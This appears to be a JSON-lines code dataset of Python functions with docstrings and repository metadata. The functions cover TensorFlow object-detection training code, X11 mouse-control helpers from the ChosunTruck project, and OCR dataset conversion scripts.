{"docstring": "'''\nParse command line arguments and return the hyperparameter dictionary H.\nH first loads the --hypes hypes.json file and is further updated with\nadditional arguments as needed.\n'''\n", "func_signal": "def main():\n", "code": "parser = argparse.ArgumentParser()\nparser.add_argument('--weights', default=None, type=str)\nparser.add_argument('--gpu', default=None, type=int)\nparser.add_argument('--hypes', required=True, type=str)\nparser.add_argument('--logdir', default='output', type=str)\nargs = parser.parse_args()\nwith open(args.hypes, 'r') as f:\n    H = json.load(f)\nif args.gpu is not None:\n    H['solver']['gpu'] = args.gpu\nif len(H.get('exp_name', '')) == 0:\n    H['exp_name'] = args.hypes.split('/')[-1].replace('.json', '')\nH['save_dir'] = args.logdir + '/%s_%s' % (H['exp_name'],\n    datetime.datetime.now().strftime('%Y_%m_%d_%H.%M'))\nif args.weights is not None:\n    H['solver']['weights'] = args.weights\ntrain(H, test_images=[])", "path": "linux\\tensorbox\\train.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "#self.move(x, y)\n\n", "func_signal": "def press(self, button=1):\n", "code": "with display_manager(self.display) as d:\n    fake_input(d, X.ButtonPress, translate_button_code(button))", "path": "linux\\tensorbox\\pymouse\\x11.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "'''\nbuild simple overfeat decoder\n'''\n", "func_signal": "def build_overfeat_inner(H, lstm_input):\n", "code": "if H['rnn_len'] > 1:\n    raise ValueError('rnn_len > 1 only supported with use_lstm == True')\noutputs = []\ninitializer = tf.random_uniform_initializer(-0.1, 0.1)\nwith tf.variable_scope('Overfeat', initializer=initializer):\n    w = tf.get_variable('ip', shape=[H['later_feat_channels'], H['lstm_size']])\n    outputs.append(tf.matmul(lstm_input, w))\nreturn outputs", "path": "linux\\tensorbox\\train.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "'''\nInput:\n    w: A 4D block tensor of shape (n, h, w, c)\n    i: A list of 3-tuples [(x_1, y_1, z_1), (x_2, y_2, z_2), ...],\n        each having type (int, float, float)\n\n    The 4D block represents a batch of 3D image feature volumes with c channels.\n    The input i is a list of points  to index into w via interpolation. Direct\n    indexing is not possible due to y_1 and z_1 being float values.\nOutput:\n    A list of the values: [\n        w[x_1, y_1, z_1, :]\n        w[x_2, y_2, z_2, :]\n        ...\n        w[x_k, y_k, z_k, :]\n    ]\n    of the same length == len(i)\n'''\n", "func_signal": "def interp(w, i, channel_dim):\n", "code": "w_as_vector = tf.reshape(w, [-1, channel_dim]) # gather expects w to be 1-d\nupper_l = tf.to_int32(tf_concat(1, [i[:, 0:1], tf.floor(i[:, 1:2]), tf.floor(i[:, 2:3])]))\nupper_r = tf.to_int32(tf_concat(1, [i[:, 0:1], tf.floor(i[:, 1:2]), tf.ceil(i[:, 2:3])]))\nlower_l = tf.to_int32(tf_concat(1, [i[:, 0:1], tf.ceil(i[:, 1:2]), tf.floor(i[:, 2:3])]))\nlower_r = tf.to_int32(tf_concat(1, [i[:, 0:1], tf.ceil(i[:, 1:2]), tf.ceil(i[:, 2:3])]))\n\nupper_l_idx = to_idx(upper_l, tf.shape(w))\nupper_r_idx = to_idx(upper_r, tf.shape(w))\nlower_l_idx = to_idx(lower_l, tf.shape(w))\nlower_r_idx = to_idx(lower_r, tf.shape(w))\n\nupper_l_value = tf.gather(w_as_vector, upper_l_idx)\nupper_r_value = tf.gather(w_as_vector, upper_r_idx)\nlower_l_value = tf.gather(w_as_vector, lower_l_idx)\nlower_r_value = tf.gather(w_as_vector, lower_r_idx)\n\nalpha_lr = tf.expand_dims(i[:, 2] - tf.floor(i[:, 2]), 1)\nalpha_ud = tf.expand_dims(i[:, 1] - tf.floor(i[:, 1]), 1)\n\nupper_value = (1 - alpha_lr) * upper_l_value + (alpha_lr) * upper_r_value\nlower_value = (1 - alpha_lr) * lower_l_value + (alpha_lr) * lower_r_value\nvalue = (1 - alpha_ud) * upper_value + (alpha_ud) * lower_value\nreturn value", "path": "linux\\tensorbox\\utils\\train_utils.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "'''\nBuild full model for training, including forward / backward passes,\noptimizers, and summary statistics.\n'''\n", "func_signal": "def build(H, q):\n", "code": "arch = H\nsolver = H[\"solver\"]\n\nos.environ['CUDA_VISIBLE_DEVICES'] = str(solver.get('gpu', ''))\n\n#gpu_options = tf.GPUOptions(per_process_gpu_memory_fraction=0.8)\ngpu_options = tf.GPUOptions()\nconfig = tf.ConfigProto(gpu_options=gpu_options)\n\nlearning_rate = tf.placeholder(tf.float32)\nif solver['opt'] == 'RMS':\n    opt = tf.train.RMSPropOptimizer(learning_rate=learning_rate,\n                                    decay=0.9, epsilon=solver['epsilon'])\nelif solver['opt'] == 'Adam':\n    opt = tf.train.AdamOptimizer(learning_rate=learning_rate,\n                                    epsilon=solver['epsilon'])\nelif solver['opt'] == 'SGD':\n    opt = tf.train.GradientDescentOptimizer(learning_rate=learning_rate)\nelse:\n    raise ValueError('Unrecognized opt type')\nloss, accuracy, confidences_loss, boxes_loss = {}, {}, {}, {}\nfor phase in ['train', 'test']:\n    # generate predictions and losses from forward pass\n    x, confidences, boxes = q[phase].dequeue_many(arch['batch_size'])\n    flags = tf.argmax(confidences, 3)\n\n\n    grid_size = H['grid_width'] * H['grid_height']\n\n    (pred_boxes, pred_confidences,\n     loss[phase], confidences_loss[phase],\n     boxes_loss[phase]) = build_forward_backward(H, x, phase, boxes, flags)\n    pred_confidences_r = tf.reshape(pred_confidences, [H['batch_size'], grid_size, H['rnn_len'], arch['num_classes']])\n    pred_boxes_r = tf.reshape(pred_boxes, [H['batch_size'], grid_size, H['rnn_len'], 4])\n\n\n    # Set up summary operations for tensorboard\n    a = tf.equal(tf.argmax(confidences[:, :, 0, :], 2), tf.argmax(pred_confidences_r[:, :, 0, :], 2))\n    accuracy[phase] = tf.reduce_mean(tf.cast(a, 'float32'), name=phase+'/accuracy')\n\n    if phase == 'train':\n        global_step = tf.Variable(0, trainable=False)\n\n        tvars = tf.trainable_variables()\n        if H['clip_norm'] <= 0:\n            grads = tf.gradients(loss['train'], tvars)\n        else:\n            grads, norm = tf.clip_by_global_norm(tf.gradients(loss['train'], tvars), H['clip_norm'])\n        train_op = opt.apply_gradients(zip(grads, tvars), global_step=global_step)\n    elif phase == 'test':\n        moving_avg = tf.train.ExponentialMovingAverage(0.95)\n        smooth_op = moving_avg.apply([accuracy['train'], accuracy['test'],\n                                      confidences_loss['train'], boxes_loss['train'],\n                                      confidences_loss['test'], boxes_loss['test'],\n                                      ])\n\n        for p in ['train', 'test']:\n            tf.summary.scalar('%s/accuracy' % p, accuracy[p])\n            tf.summary.scalar('%s/accuracy/smooth' % p, moving_avg.average(accuracy[p]))\n            tf.summary.scalar(\"%s/confidences_loss\" % p, confidences_loss[p])\n            tf.summary.scalar(\"%s/confidences_loss/smooth\" % p,\n                moving_avg.average(confidences_loss[p]))\n            tf.summary.scalar(\"%s/regression_loss\" % p, boxes_loss[p])\n            tf.summary.scalar(\"%s/regression_loss/smooth\" % p,\n                moving_avg.average(boxes_loss[p]))\n\n    if phase == 'test':\n        test_image = x\n        # show ground truth to verify labels are correct\n        test_true_confidences = confidences[0, :, :, :]\n        test_true_boxes = boxes[0, :, :, :]\n\n        # show predictions to visualize training progress\n        test_pred_confidences = pred_confidences_r[0, :, :, :]\n        test_pred_boxes = pred_boxes_r[0, :, :, :]\n\n        def log_image(np_img, np_confidences, np_boxes, np_global_step, pred_or_true):\n\n            merged = train_utils.add_rectangles(H, np_img, np_confidences, np_boxes,\n                                                use_stitching=True,\n                                                rnn_len=H['rnn_len'])[0]\n\n            num_images = 10\n            img_path = os.path.join(H['save_dir'], '%s_%s.jpg' % ((np_global_step / H['logging']['display_iter']) % num_images, pred_or_true))\n            misc.imsave(img_path, merged)\n            return merged\n\n        pred_log_img = tf.py_func(log_image,\n                                  [test_image, test_pred_confidences, test_pred_boxes, global_step, 'pred'],\n                                  [tf.float32])\n        true_log_img = tf.py_func(log_image,\n                                  [test_image, test_true_confidences, test_true_boxes, global_step, 'true'],\n                                  [tf.float32])\n        tf.summary.image(phase + '/pred_boxes', pred_log_img, max_outputs=10)\n        tf.summary.image(phase + '/true_boxes', true_log_img, max_outputs=10)\n\nsummary_op = tf.summary.merge_all()\n\nreturn (config, loss, accuracy, summary_op, train_op,\n        smooth_op, global_step, learning_rate)", "path": "linux\\tensorbox\\train.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "'''\nFunction used for rezooming high level feature maps. Uses bilinear interpolation\nto select all channels at index (x, y) for a high level feature map, where x and y are floats.\n'''\n", "func_signal": "def bilinear_select(H, pred_boxes, early_feat, early_feat_channels, w_offset, h_offset):\n", "code": "grid_size = H['grid_width'] * H['grid_height']\nouter_size = grid_size * H['batch_size']\n\nfine_stride = 8. # pixels per 60x80 grid cell in 480x640 image\ncoarse_stride = H['region_size'] # pixels per 15x20 grid cell in 480x640 image\nbatch_ids = []\nx_offsets = []\ny_offsets = []\nfor n in range(H['batch_size']):\n    for i in range(H['grid_height']):\n        for j in range(H['grid_width']):\n            for k in range(H['rnn_len']):\n                batch_ids.append([n])\n                x_offsets.append([coarse_stride / 2. + coarse_stride * j])\n                y_offsets.append([coarse_stride / 2. + coarse_stride * i])\n\nbatch_ids = tf.constant(batch_ids)\nx_offsets = tf.constant(x_offsets)\ny_offsets = tf.constant(y_offsets)\n\npred_boxes_r = tf.reshape(pred_boxes, [outer_size * H['rnn_len'], 4])\nscale_factor = coarse_stride / fine_stride # scale difference between 15x20 and 60x80 features\n\npred_x_center = (pred_boxes_r[:, 0:1] + w_offset * pred_boxes_r[:, 2:3] + x_offsets) / fine_stride\npred_x_center_clip = tf.clip_by_value(pred_x_center,\n                                 0,\n                                 scale_factor * H['grid_width'] - 1)\npred_y_center = (pred_boxes_r[:, 1:2] + h_offset * pred_boxes_r[:, 3:4] + y_offsets) / fine_stride\npred_y_center_clip = tf.clip_by_value(pred_y_center,\n                                      0,\n                                      scale_factor * H['grid_height'] - 1)\n\ninterp_indices = tf_concat(1, [tf.to_float(batch_ids), pred_y_center_clip, pred_x_center_clip])\nreturn interp_indices", "path": "linux\\tensorbox\\utils\\train_utils.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "\"\"\"Subsamples the input along the spatial dimensions.\n\nArgs:\n  inputs: A `Tensor` of size [batch, height_in, width_in, channels].\n  factor: The subsampling factor.\n  scope: Optional variable_scope.\n\nReturns:\n  output: A `Tensor` of size [batch, height_out, width_out, channels] with the\n    input, either intact (if factor == 1) or subsampled (if factor > 1).\n\"\"\"\n", "func_signal": "def subsample(inputs, factor, scope=None):\n", "code": "if factor == 1:\n  return inputs\nelse:\n  return layers.max_pool2d(inputs, [1, 1], stride=factor, scope=scope)", "path": "linux\\tensorbox\\utils\\slim_nets\\resnet_utils.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "\"\"\"\nClick a mouse button n times on a given x, y.\nButton is defined as 1 = left, 2 = right, 3 = middle.\n\"\"\"\n\n", "func_signal": "def click(self, x, y, button=1, n=1):\n", "code": "for i in range(n):\n    self.press(x, y, button)\n    self.release(x, y, button)", "path": "linux\\tensorbox\\pymouse\\base.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "'''\nCall build_forward() and then setup the loss functions\n'''\n\n", "func_signal": "def build_forward_backward(H, x, phase, boxes, flags):\n", "code": "grid_size = H['grid_width'] * H['grid_height']\nouter_size = grid_size * H['batch_size']\nreuse = {'train': None, 'test': True}[phase]\nif H['use_rezoom']:\n    (pred_boxes, pred_logits,\n     pred_confidences, pred_confs_deltas, pred_boxes_deltas) = build_forward(H, x, phase, reuse)\nelse:\n    pred_boxes, pred_logits, pred_confidences = build_forward(H, x, phase, reuse)\nwith tf.variable_scope('decoder', reuse={'train': None, 'test': True}[phase]):\n    outer_boxes = tf.reshape(boxes, [outer_size, H['rnn_len'], 4])\n    outer_flags = tf.cast(tf.reshape(flags, [outer_size, H['rnn_len']]), 'int32')\n    if H['use_lstm']:\n        hungarian_module = tf.load_op_library('utils/hungarian/hungarian.so')\n        assignments, classes, perm_truth, pred_mask = (\n            hungarian_module.hungarian(pred_boxes, outer_boxes, outer_flags, H['solver']['hungarian_iou']))\n    else:\n        classes = tf.reshape(flags, (outer_size, 1))\n        perm_truth = tf.reshape(outer_boxes, (outer_size, 1, 4))\n        pred_mask = tf.reshape(tf.cast(tf.greater(classes, 0), 'float32'), (outer_size, 1, 1))\n    true_classes = tf.reshape(tf.cast(tf.greater(classes, 0), 'int64'),\n                              [outer_size * H['rnn_len']])\n    pred_logit_r = tf.reshape(pred_logits,\n                              [outer_size * H['rnn_len'], H['num_classes']])\n    confidences_loss = (tf.reduce_sum(\n        tf.nn.sparse_softmax_cross_entropy_with_logits(logits=pred_logit_r, labels=true_classes))\n        ) / outer_size * H['solver']['head_weights'][0]\n    residual = tf.reshape(perm_truth - pred_boxes * pred_mask,\n                          [outer_size, H['rnn_len'], 4])\n    boxes_loss = tf.reduce_sum(tf.abs(residual)) / outer_size * H['solver']['head_weights'][1]\n    if H['use_rezoom']:\n        if H['rezoom_change_loss'] == 'center':\n            error = (perm_truth[:, :, 0:2] - pred_boxes[:, :, 0:2]) / tf.maximum(perm_truth[:, :, 2:4], 1.)\n            square_error = tf.reduce_sum(tf.square(error), 2)\n            inside = tf.reshape(tf.to_int64(tf.logical_and(tf.less(square_error, 0.2**2), tf.greater(classes, 0))), [-1])\n        elif H['rezoom_change_loss'] == 'iou':\n            iou = train_utils.iou(train_utils.to_x1y1x2y2(tf.reshape(pred_boxes, [-1, 4])),\n                                  train_utils.to_x1y1x2y2(tf.reshape(perm_truth, [-1, 4])))\n            inside = tf.reshape(tf.to_int64(tf.greater(iou, 0.5)), [-1])\n        else:\n            assert H['rezoom_change_loss'] == False\n            inside = tf.reshape(tf.to_int64((tf.greater(classes, 0))), [-1])\n        new_confs = tf.reshape(pred_confs_deltas, [outer_size * H['rnn_len'], H['num_classes']])\n        delta_confs_loss = tf.reduce_sum(\n            tf.nn.sparse_softmax_cross_entropy_with_logits(logits=new_confs, labels=inside)) / outer_size * H['solver']['head_weights'][0] * 0.1\n\n        pred_logits_squash = tf.reshape(new_confs,\n                                        [outer_size * H['rnn_len'], H['num_classes']])\n        pred_confidences_squash = tf.nn.softmax(pred_logits_squash)\n        pred_confidences = tf.reshape(pred_confidences_squash,\n                                  [outer_size, H['rnn_len'], H['num_classes']])\n        loss = confidences_loss + boxes_loss + delta_confs_loss\n        if H['reregress']:\n            delta_residual = tf.reshape(perm_truth - (pred_boxes + pred_boxes_deltas) * pred_mask,\n                                        [outer_size, H['rnn_len'], 4])\n            delta_boxes_loss = (tf.reduce_sum(tf.minimum(tf.square(delta_residual), 10. ** 2)) /\n                           outer_size * H['solver']['head_weights'][1] * 0.03)\n            boxes_loss = delta_boxes_loss\n\n            tf.summary.histogram(phase + '/delta_hist0_x', pred_boxes_deltas[:, 0, 0])\n            tf.summary.histogram(phase + '/delta_hist0_y', pred_boxes_deltas[:, 0, 1])\n            tf.summary.histogram(phase + '/delta_hist0_w', pred_boxes_deltas[:, 0, 2])\n            tf.summary.histogram(phase + '/delta_hist0_h', pred_boxes_deltas[:, 0, 3])\n            loss += delta_boxes_loss\n    else:\n        loss = confidences_loss + boxes_loss\n\nreturn pred_boxes, pred_confidences, loss, confidences_loss, boxes_loss", "path": "linux\\tensorbox\\train.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "'''\nConstruct the forward model\n'''\n\n", "func_signal": "def build_forward(H, x, phase, reuse):\n", "code": "grid_size = H['grid_width'] * H['grid_height']\nouter_size = grid_size * H['batch_size']\ninput_mean = 117.\nx -= input_mean\ncnn, early_feat = googlenet_load.model(x, H, reuse)\nearly_feat_channels = H['early_feat_channels']\nearly_feat = early_feat[:, :, :, :early_feat_channels]\n\nif H['deconv']:\n    size = 3\n    stride = 2\n    pool_size = 5\n\n    with tf.variable_scope(\"deconv\", reuse=reuse):\n        w = tf.get_variable('conv_pool_w', shape=[size, size, H['later_feat_channels'], H['later_feat_channels']],\n                            initializer=tf.random_normal_initializer(stddev=0.01))\n        cnn_s = tf.nn.conv2d(cnn, w, strides=[1, stride, stride, 1], padding='SAME')\n        cnn_s_pool = tf.nn.avg_pool(cnn_s[:, :, :, :256], ksize=[1, pool_size, pool_size, 1],\n                                    strides=[1, 1, 1, 1], padding='SAME')\n\n        cnn_s_with_pool = tf_concat(3, [cnn_s_pool, cnn_s[:, :, :, 256:]])\n        cnn_deconv = deconv(cnn_s_with_pool, output_shape=[H['batch_size'], H['grid_height'], H['grid_width'], 256], channels=[H['later_feat_channels'], 256])\n        cnn = tf_concat(3, (cnn_deconv, cnn[:, :, :, 256:]))\n\nelif H['avg_pool_size'] > 1:\n    pool_size = H['avg_pool_size']\n    cnn1 = cnn[:, :, :, :700]\n    cnn2 = cnn[:, :, :, 700:]\n    cnn2 = tf.nn.avg_pool(cnn2, ksize=[1, pool_size, pool_size, 1],\n                          strides=[1, 1, 1, 1], padding='SAME')\n    cnn = tf_concat(3, [cnn1, cnn2])\n\ncnn = tf.reshape(cnn,\n                 [H['batch_size'] * H['grid_width'] * H['grid_height'], H['later_feat_channels']])\ninitializer = tf.random_uniform_initializer(-0.1, 0.1)\nwith tf.variable_scope('decoder', reuse=reuse, initializer=initializer):\n    scale_down = 0.01\n    lstm_input = tf.reshape(cnn * scale_down, (H['batch_size'] * grid_size, H['later_feat_channels']))\n    if H['use_lstm']:\n        lstm_outputs = build_lstm_inner(H, lstm_input)\n    else:\n        lstm_outputs = build_overfeat_inner(H, lstm_input)\n\n    pred_boxes = []\n    pred_logits = []\n    for k in range(H['rnn_len']):\n        output = lstm_outputs[k]\n        if phase == 'train':\n            output = tf.nn.dropout(output, 0.5)\n        box_weights = tf.get_variable('box_ip%d' % k,\n                                      shape=(H['lstm_size'], 4))\n        conf_weights = tf.get_variable('conf_ip%d' % k,\n                                       shape=(H['lstm_size'], H['num_classes']))\n\n        pred_boxes_step = tf.reshape(tf.matmul(output, box_weights) * 50,\n                                     [outer_size, 1, 4])\n\n        pred_boxes.append(pred_boxes_step)\n        pred_logits.append(tf.reshape(tf.matmul(output, conf_weights),\n                                     [outer_size, 1, H['num_classes']]))\n\n    pred_boxes = tf_concat(1, pred_boxes)\n    pred_logits = tf_concat(1, pred_logits)\n    pred_logits_squash = tf.reshape(pred_logits,\n                                    [outer_size * H['rnn_len'], H['num_classes']])\n    pred_confidences_squash = tf.nn.softmax(pred_logits_squash)\n    pred_confidences = tf.reshape(pred_confidences_squash,\n                                  [outer_size, H['rnn_len'], H['num_classes']])\n\n    if H['use_rezoom']:\n        pred_confs_deltas = []\n        pred_boxes_deltas = []\n        w_offsets = H['rezoom_w_coords']\n        h_offsets = H['rezoom_h_coords']\n        num_offsets = len(w_offsets) * len(h_offsets)\n        rezoom_features = rezoom(H, pred_boxes, early_feat, early_feat_channels, w_offsets, h_offsets)\n        if phase == 'train':\n            rezoom_features = tf.nn.dropout(rezoom_features, 0.5)\n        for k in range(H['rnn_len']):\n            delta_features = tf_concat(1, [lstm_outputs[k], rezoom_features[:, k, :] / 1000.])\n            dim = 128\n            delta_weights1 = tf.get_variable(\n                                'delta_ip1%d' % k,\n                                shape=[H['lstm_size'] + early_feat_channels * num_offsets, dim])\n            # TODO: add dropout here ?\n            ip1 = tf.nn.relu(tf.matmul(delta_features, delta_weights1))\n            if phase == 'train':\n                ip1 = tf.nn.dropout(ip1, 0.5)\n            delta_confs_weights = tf.get_variable(\n                                'delta_ip2%d' % k,\n                                shape=[dim, H['num_classes']])\n            if H['reregress']:\n                delta_boxes_weights = tf.get_variable(\n                                    'delta_ip_boxes%d' % k,\n                                    shape=[dim, 4])\n                pred_boxes_deltas.append(tf.reshape(tf.matmul(ip1, delta_boxes_weights) * 5,\n                                                    [outer_size, 1, 4]))\n            scale = H.get('rezoom_conf_scale', 50)\n            pred_confs_deltas.append(tf.reshape(tf.matmul(ip1, delta_confs_weights) * scale,\n                                                [outer_size, 1, H['num_classes']]))\n        pred_confs_deltas = tf_concat(1, pred_confs_deltas)\n        if H['reregress']:\n            pred_boxes_deltas = tf_concat(1, pred_boxes_deltas)\n        return pred_boxes, pred_logits, pred_confidences, pred_confs_deltas, pred_boxes_deltas\n\nreturn pred_boxes, pred_logits, pred_confidences", "path": "linux\\tensorbox\\train.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "#self.move(x, y)\n\n", "func_signal": "def release(self, button=1):\n", "code": "with display_manager(self.display) as d:\n    fake_input(d, X.ButtonRelease, translate_button_code(button))", "path": "linux\\tensorbox\\pymouse\\x11.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "# MA:\n#self.legend = legend(self.legendNames, self.legendPlace, pad = self.legendborderpad, labelsep = self.legendlabelsep)\n", "func_signal": "def finishPlot(self, axlimits = [0,1.0,0,1.0]):\n", "code": "self.legend = legend(self.legendNames, self.legendPlace)\n\nlstrings = self.legend.get_texts()\nsetp(lstrings, fontsize=self.fontsizeLegend)\n#line= plot( [1 - axlimits[0], 0], [axlimits[3], 1 - axlimits[3] ] , 'k')\nline= plot( [1, 0], [0, 1] , 'k')", "path": "linux\\tensorbox\\utils\\annolist\\MatPlotter.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "\"\"\"Take the idlfile and net configuration and create a generator\nthat outputs a jittered version of a random image from the annolist\nthat is mean corrected.\"\"\"\n\n", "func_signal": "def load_idl_tf(idlfile, H, jitter):\n", "code": "annolist = al.parse(idlfile)\nannos = []\nfor anno in annolist:\n    anno.imageName = os.path.join(\n        os.path.dirname(os.path.realpath(idlfile)), anno.imageName)\n    annos.append(anno)\nrandom.seed(0)\nif H['data']['truncate_data']:\n    annos = annos[:10]\nfor epoch in itertools.count():\n    random.shuffle(annos)\n    for anno in annos:\n        I = imread(anno.imageName)", "path": "linux\\tensorbox\\utils\\train_utils.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "'''\nRezoom into a feature map at multiple interpolation points in a grid.\nIf the predicted object center is at X, len(w_offsets) == 3, and len(h_offsets) == 5,\nthe rezoom grid will look as follows:\n[o o o]\n[o o o]\n[o X o]\n[o o o]\n[o o o]\nWhere each letter indexes into the feature map with bilinear interpolation\n'''\n\n\n", "func_signal": "def rezoom(H, pred_boxes, early_feat, early_feat_channels, w_offsets, h_offsets):\n", "code": "grid_size = H['grid_width'] * H['grid_height']\nouter_size = grid_size * H['batch_size']\nindices = []\nfor w_offset in w_offsets:\n    for h_offset in h_offsets:\n        indices.append(train_utils.bilinear_select(H,\n                                                   pred_boxes,\n                                                   early_feat,\n                                                   early_feat_channels,\n                                                   w_offset, h_offset))\n\ninterp_indices = tf_concat(0, indices)\nrezoom_features = train_utils.interp(early_feat,\n                                     interp_indices,\n                                     early_feat_channels)\nrezoom_features_r = tf.reshape(rezoom_features,\n                               [len(w_offsets) * len(h_offsets),\n                                outer_size,\n                                H['rnn_len'],\n                                early_feat_channels])\nrezoom_features_t = tf.transpose(rezoom_features_r, [1, 2, 0, 3])\nreturn tf.reshape(rezoom_features_t,\n                  [outer_size,\n                   H['rnn_len'],\n                   len(w_offsets) * len(h_offsets) * early_feat_channels])", "path": "linux\\tensorbox\\train.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "# scrollup=4, scrolldown=5, scrollleft=6, scrollright=7\n", "func_signal": "def button_code_to_scroll_direction(button):\n", "code": "return {\n    4: (1, 0),\n    5: (-1, 0),\n    6: (0, 1),\n    7: (0, -1),\n}[button]", "path": "linux\\tensorbox\\pymouse\\x11.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "# self.newFigure()\n", "func_signal": "def __init__(self, fontsize=15):\n", "code": "self.fontsize=fontsize\nself.fontsizeLegend=fontsize - 1\npass", "path": "linux\\tensorbox\\utils\\annolist\\MatPlotter.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "# In X11, the button numbers are:\n#  leftclick=1, middleclick=2, rightclick=3\n#  For the purposes of the cross-platform interface of PyMouse, we\n#  invert the button number values of the right and middle buttons\n", "func_signal": "def translate_button_code(button):\n", "code": "if button in [1, 2, 3]:\n    return (None, 1, 3, 2)[button]\nelse:\n    return button", "path": "linux\\tensorbox\\pymouse\\x11.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "\"\"\"Traps *X* errors and raises an :class:``X11Error`` at the end if any\nerror occurred.\n\nThis handler also ensures that the :class:`Xlib.display.Display` being\nmanaged is sync'd.\n\n:param Xlib.display.Display display: The *X* display.\n\n:return: the display\n:rtype: Xlib.display.Display\n\"\"\"\n", "func_signal": "def display_manager(display):\n", "code": "from contextlib import contextmanager\n\n@contextmanager\ndef manager():\n    errors = []\n\n    def handler(*args):\n        errors.append(args)\n\n    old_handler = display.set_error_handler(handler)\n    yield display\n    display.sync()\n    display.set_error_handler(old_handler)\n    if errors:\n        raise X11Error(errors)\n\nreturn manager()", "path": "linux\\tensorbox\\pymouse\\x11.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "'''\nbuild lstm decoder\n'''\n", "func_signal": "def build_lstm_inner(H, lstm_input):\n", "code": "lstm_cell = rnn_cell.BasicLSTMCell(H['lstm_size'], forget_bias=0.0, state_is_tuple=False)\nif H['num_lstm_layers'] > 1:\n    lstm = rnn_cell.MultiRNNCell([lstm_cell] * H['num_lstm_layers'], state_is_tuple=False)\nelse:\n    lstm = lstm_cell\n\nbatch_size = H['batch_size'] * H['grid_height'] * H['grid_width']\nstate = tf.zeros([batch_size, lstm.state_size])\n\noutputs = []\nwith tf.variable_scope('RNN', initializer=tf.random_uniform_initializer(-0.1, 0.1)):\n    for time_step in range(H['rnn_len']):\n        if time_step > 0: tf.get_variable_scope().reuse_variables()\n        output, state = lstm(lstm_input, state)\n        outputs.append(output)\nreturn outputs", "path": "linux\\tensorbox\\train.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
{"docstring": "\"\"\"\n\u5c06icdar2015\u683c\u5f0f\u7684gt\u8f6c\u6362\u4e3ajson\u683c\u5f0f\n:param gt_path:\n:param save_path:\n:return:\n\"\"\"\n", "func_signal": "def cvt(save_path, img_folder):\n", "code": "gt_dict = {'data_root': img_folder}\ndata_list = []\nfor img_path in tqdm(get_file_list(img_folder, p_postfix=['.jpg'])):\n    img_path = pathlib.Path(img_path)\n    gt_path = pathlib.Path(img_folder) / img_path.name.replace('.jpg', '.txt')\n    content = load(gt_path)\n    cur_gt = {'img_name': img_path.name, 'annotations': []}\n    for line in content:\n        cur_line_gt = {'polygon': [], 'text': '', 'illegibility': False, 'language': 'Latin'}\n        chars_gt = [{'polygon': [], 'char': '', 'illegibility': False, 'language': 'Latin'}]\n        cur_line_gt['chars'] = chars_gt\n        line = line.split(',')\n        # \u5b57\u7b26\u4e32\u7ea7\u522b\u7684\u4fe1\u606f\n        x1, y1, x2, y2, x3, y3, x4, y4 = list(map(float, line[:8]))\n        cur_line_gt['polygon'] = [[x1, y1], [x2, y2], [x3, y3], [x4, y4]]\n        cur_line_gt['text'] = line[-1][1:-1]\n        cur_line_gt['illegibility'] = True if line[8] == '1' else False\n        cur_gt['annotations'].append(cur_line_gt)\n    data_list.append(cur_gt)\ngt_dict['data_list'] = data_list\nsave(gt_dict, save_path)", "path": "convert\\det\\icdar2017rctw2json.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\nCreate LMDB dataset for CRNN training.\n\nARGS:\n    outputPath    : LMDB output path\n    data_dict : a dict contains img_path,texts,text_polys\n    checkValid    : if true, check the validity of every image\n\"\"\"\n# If lmdb file already exists, remove it. Or the new data will add to it.\n", "func_signal": "def createDataset(outputPath, data_dict, map_size=79951162, checkValid=True):\n", "code": "if os.path.exists(outputPath):\n    shutil.rmtree(outputPath)\n    os.makedirs(outputPath)\nelse:\n    os.makedirs(outputPath)\n\nnSamples = len(data_dict)\nenv = lmdb.open(outputPath, map_size=map_size)\ncache = {}\ncnt = 1\nfor img_path in data_dict:\n    data = data_dict[img_path]\n    if not os.path.exists(img_path):\n        print('%s does not exist' % img_path)\n        continue\n    with open(img_path, 'rb') as f:\n        imageBin = f.read()\n    if checkValid:\n        if not checkImageIsValid(imageBin):\n            print('%s is not a valid image' % img_path)\n            continue\n\n    imageKey = 'image-%09d' % cnt\n    polygonsKey = 'polygons-%09d' % cnt\n    textsKey = 'texts-%09d' % cnt\n    illegibilityKey = 'illegibility-%09d' % cnt\n    languageKey = 'language-%09d' % cnt\n    cache[imageKey] = imageBin\n    cache[polygonsKey] = np.array(data['polygons']).tostring()\n    cache[textsKey] = '\\t'.join(data['texts'])\n    cache[illegibilityKey] = '\\t'.join([str(x) for x in data['illegibility_list']])\n    cache[languageKey] = '\\t'.join(data['language_list'])\n    if cnt % 